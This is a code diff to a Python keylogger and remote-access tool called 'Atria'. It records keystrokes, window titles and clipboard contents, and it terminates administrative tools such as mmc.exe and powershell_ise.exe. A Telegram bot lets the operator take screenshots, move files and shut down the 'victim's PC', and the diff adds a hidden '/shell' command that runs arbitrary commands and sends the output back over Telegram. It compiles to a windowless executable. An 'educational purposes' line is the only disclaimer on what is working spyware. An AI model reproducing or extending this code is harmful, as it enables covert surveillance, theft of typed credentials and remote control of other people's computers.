@@ -29,11 +29,18 @@ from PyQt6.QtWidgets import (
     QMessageBox,
 )
 
-# Constants
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                               [Constants]                                               #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
 IS_COMPILED = getattr(sys, 'frozen', False)
 BOT_TOKEN_FILE = 'bot_config.txt'
+current_directory = os.getcwd()
 
-# Retry Decorator
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                  [Retry Function on Exception Error]                                    #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
 def retry_on_exception(exception_type, retries=3, delay=1):
     def decorator(func):
         @wraps(func)
@@ -48,22 +55,16 @@ def retry_on_exception(exception_type, retries=3, delay=1):
         return wrapper
     return decorator
 
-# Function to get the correct path to resources, whether compiled or not
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                 [Resource Path Functions for Config]                                    #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
 def get_resource_path():
     if IS_COMPILED:
         return os.path.join(sys._MEIPASS, 'bot_config.txt')
     else:
         return os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bot_config.txt')
-
-# Keylogger Functions
-def log_message(message, log_type='keylog'):
-    try:
-        file_path = session_files['clipboard'] if log_type == 'clipboard' else session_files['log']
-        with open(file_path, 'a', encoding='utf-8') as f:
-            f.write(f'{message}\n')
-    except Exception as e:
-        print(f"Error writing to log file: {e}")
-
+    
 def load_configuration():
     config_path = get_resource_path()
     try:
@@ -74,13 +75,28 @@ def load_configuration():
         log_message(f"Error loading configuration: {e}", 'error')
         return None, None
 
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                      [Keylogger Main Functions]                                         #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
+def log_message(message, log_type='keylog'):
+    try:
+        file_path = session_files['clipboard'] if log_type == 'clipboard' else session_files['log']
+        with open(file_path, 'a', encoding='utf-8') as f:
+            f.write(f'{message}\n')
+    except Exception as e:
+        print(f"Error writing to log file: {e}")
+
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                  [Telegram Bot Functions & Commands]                                    #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
 def start_message():
     send_message("Monitoring started!")
     send_message("Thank you for using Atria!")
     send_message("Use this script only for educational purposes!")
     send_message("To list all commands, type /help in the chatbox.")
 
-# Telegram Bot
 bot_token, chat_id = load_configuration()
 bot = telebot.TeleBot(bot_token) if bot_token and chat_id else None
 
@@ -98,7 +114,8 @@ def send_help(message):
         "/upload - Upload file from victim's PC\n"
         "/download - Download file from victim's PC\n"
         "/shutdown - Execute shutdown to the victim's PC\n"
-        "/restart - Execute restart to the victim's PC"
+        "/restart - Execute restart to the victim's PC\n"
+        "/shell <command> - Execute commands using a hidden shell"
     )
     bot.send_message(message.chat.id, help_message)
 
@@ -106,15 +123,12 @@ def send_help(message):
 def send_photo(message):
     if bot:
         try:
-            # Capture screenshot
             screenshot = pyautogui.screenshot()
 
-            # Save to a BytesIO object
             buffer = io.BytesIO()
             screenshot.save(buffer, format='PNG')
             buffer.seek(0)
 
-            # Send screenshot
             url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
             files = {'photo': ('screenshot.png', buffer, 'image/png')}
             payload = {'chat_id': chat_id}
@@ -132,7 +146,35 @@ def download_file(message):
         f.write(requests.get(file_url).content)
     bot.send_message(chat_id, f"File downloaded: {file_name}")
 
-# Continuation of Keylogger Functions
+@bot.message_handler(commands=['shell'])
+def shell_command(message):
+    global current_directory
+
+    cmd = message.text[7:]
+
+    if cmd.startswith('cd '):
+        try:
+            new_directory = cmd[3:].strip()
+            os.chdir(new_directory)
+            current_directory = os.getcwd()
+            output = f"Changed directory to {current_directory}"
+        except Exception as e:
+            output = f"Error: {e}"
+    else:
+        try:
+            output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
+            output = output.decode('utf-8')
+        except subprocess.CalledProcessError as e:
+            output = f"Error: {e.output.decode('utf-8')}"
+        except Exception as e:
+            output = f"Error: {e}"
+
+    bot.send_message(message.chat.id, output)
+
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                 [Continuation of Keylogger Functions]                                   #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
 def get_app_dir():
     return os.path.join(os.path.expanduser('~'), 'Documents', 'Driver')
 
@@ -158,21 +200,23 @@ def log_sentence():
         sentence = ''
 
 def monitor_active_window():
-    try:
-        previous_window = None
-        while True:
+    previous_window = None
+    while True:
+        try:
             current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             active_window = gw.getActiveWindow()
-            window_title = active_window.title if active_window else 'No active window'
-            if window_title != previous_window:
-                if previous_window is not None:
-                    log_sentence()
-                log_message(f'[{current_time}] Active Window: {window_title}')
-                previous_window = window_title
-            time.sleep(0.1)
-    except Exception as e:
-        log_message(f"Error in monitor_active_window: {e}", 'error')
-        time.sleep(5)  # Wait before retrying
+            if active_window:
+                window_title = active_window.title
+                if window_title != previous_window:
+                    if previous_window is not None:
+                        log_sentence()
+                    log_message(f'[{current_time}] Active Window: {window_title}')
+                    previous_window = window_title
+            else:
+                log_message(f'[{current_time}] Active Window: No active window')
+        except Exception as e:
+            log_message(f"Error in monitor_active_window: {e}", 'error')
+        time.sleep(0.1)
 
 def on_key_press(event):
     try:
@@ -202,20 +246,7 @@ def monitor_clipboard():
             time.sleep(1)
     except Exception as e:
         log_message(f"Error in monitor_clipboard: {e}", 'error')
-        time.sleep(5)  # Wait before retrying
-
-def monitor_processes():
-    while True:
-        try:
-            for proc in psutil.process_iter(['pid', 'name']):
-                if proc.info['name'] in ['mmc.exe', 'powershell_ise.exe']:  # Add the second process name
-                    try:
-                        proc.terminate()
-                    except Exception as e:
-                        log_message(f"Error terminating {proc.info['name']}: {e}", 'error')
-        except Exception as e:
-            log_message(f"Error in monitor_processes: {e}", 'error')
-        time.sleep(0.1)
+        time.sleep(5)
 
 def finalize_session(signum=None, frame=None):
     try:
@@ -224,7 +255,27 @@ def finalize_session(signum=None, frame=None):
     except Exception as e:
         log_message(f"Error in finalize_session: {e}", 'error')
 
-# GUI Functions
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                    [Monitor Application Functions]                                      #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
+def monitor_processes():
+    while True:
+        try:
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'] in ['mmc.exe', 'powershell_ise.exe']:
+                    try:
+                        proc.terminate()
+                    except Exception as e:
+                        log_message(f"Error terminating {proc.info['name']}: {e}", 'error')
+        except Exception as e:
+            log_message(f"Error in monitor_processes: {e}", 'error')
+        time.sleep(0.1)
+
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                                        [GUI Layout Functions]                                           #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
 class BotConfigGUI(QWidget):
     def __init__(self):
         super().__init__()
@@ -269,13 +320,9 @@ class BotConfigGUI(QWidget):
 
     def compile_script(self):
         try:
-            # Inform the user that compilation is starting
             QMessageBox.information(self, 'Compilation', 'Compilation started. Check the command prompt for logs.')
-
-            # Close the GUI
             self.close()
 
-            # Start the compilation process in a new command prompt window
             subprocess.Popen(
                 'start cmd.exe /K pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py',
                 shell=True
@@ -283,7 +330,10 @@ class BotConfigGUI(QWidget):
         except Exception as e:
             QMessageBox.critical(self, 'Error', f'Failed to start compilation: {str(e)}')
 
-# Monitoring and Exit Processes
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+#                       [Condition Checker Function if Compiled or Not Compiled]                          #
+# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
+
 if __name__ == '__main__':
     if not IS_COMPILED:
         app = QApplication(sys.argv)
